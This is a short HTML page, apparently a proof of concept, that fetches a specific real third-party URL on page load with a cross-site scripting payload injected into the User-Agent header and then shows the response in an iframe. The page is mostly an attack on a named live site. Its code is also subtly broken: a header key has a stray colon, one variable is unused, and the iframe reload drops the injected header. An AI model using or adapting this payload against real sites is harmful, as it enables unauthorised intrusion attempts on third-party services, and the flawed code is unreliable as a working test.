<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Request with Custom Header and Display in iframe</title>
</head>
<body>
  <iframe id="myFrame" width="100%" height="500"></iframe>

  <script>
    // Function to send request with custom headers and load response in iframe
    function sendRequestAndLoadInFrame() {
      // URL to send request to
      var url = 'https://cloud.update.lieferando.at/en';
      
      // Custom headers
      var headers = {
        'User-Agent:':'Mozilla/5.0 (X11;"><script>alert(1)<\/script> Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
      };

      // Construct headers string
      var headersString = Object.keys(headers).map(key => `${key}: ${headers[key]}`).join('\n');

      // Fetch the URL with custom headers
      fetch(url, {
        method: 'GET', // or 'POST', 'PUT', etc.
        headers: headers
      })
      .then(response => {
        // Load response in iframe
        document.getElementById('myFrame').src = response.url;
      })
      .catch(error => {
        console.error('Error:', error);
      });
    }

    // Call the function when page loads
    sendRequestAndLoadInFrame();
  </script>
</body>
</html>
